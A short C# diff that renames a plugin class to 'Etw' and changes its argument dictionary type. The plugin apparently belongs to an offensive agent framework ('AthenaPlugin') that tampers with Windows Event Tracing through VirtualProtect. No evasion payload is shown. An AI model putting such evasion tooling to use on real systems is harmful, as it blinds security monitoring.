@@ -17,10 +17,10 @@ namespace Plugins
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     }
-    public class Plugin : AthenaPlugin
+    public class Etw : AthenaPlugin
     {
         public override string Name => "etw";
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
             try
             {
